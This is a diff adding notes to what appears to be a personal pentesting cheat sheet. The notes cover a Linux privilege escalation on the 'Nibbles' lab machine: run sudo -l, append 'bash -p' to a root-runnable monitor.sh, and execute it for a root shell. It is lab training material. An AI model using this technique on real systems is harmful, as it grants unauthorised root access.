@@ -514,3 +514,21 @@ LINUX INTERACTIVE SHELL
 #####################
 INTERACTIVE SHELL:
         https://fahmifj.medium.com/get-a-fully-interactive-reverse-shell-b7e8d6f5b1c1
+
+
+
+
+#####################
+LINUX Monitor.sh Priv Escal Manual
+#####################
+sudo -l <-- find monitor.sh
+            User nibbler may run the following commands on Nibbles:
+            (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+
+            
+ We will modify monitor.sh:
+        nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh
+
+        we can add a command at the end of the script:
+            echo "bash -p" >> monitor.sh
+            sudo -u root ./monitor.sh
